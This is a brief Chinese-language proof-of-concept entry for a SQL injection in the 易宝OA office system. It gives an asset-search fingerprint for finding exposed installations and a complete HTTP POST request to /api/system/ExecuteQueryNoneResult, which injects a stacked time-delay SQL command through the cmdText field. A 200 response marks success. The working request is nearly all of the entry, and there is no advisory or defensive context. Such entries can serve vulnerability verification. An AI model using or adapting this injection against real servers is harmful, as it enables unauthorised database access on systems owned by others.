﻿# 易宝OA ExecuteQueryNoneResult SQL注入漏洞

> 更新时间：2024-04-16

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：product="顶讯科技-易宝OA系统"

> 验证脚本：HTTP

```
POST /api/system/ExecuteQueryNoneResult HTTP/1.1
Content-Type: application/x-www-form-urlencoded
Accept-Encoding: gzip

token=zxh&cmdText=;WAITFOR DELAY '0:0:5'--
```

> 响应代码特征：200

> 响应内容特征：

> 上传文件定位：

> 验证文件来源：易宝OA ExecuteQueryNoneResult SQL注入漏洞.poc

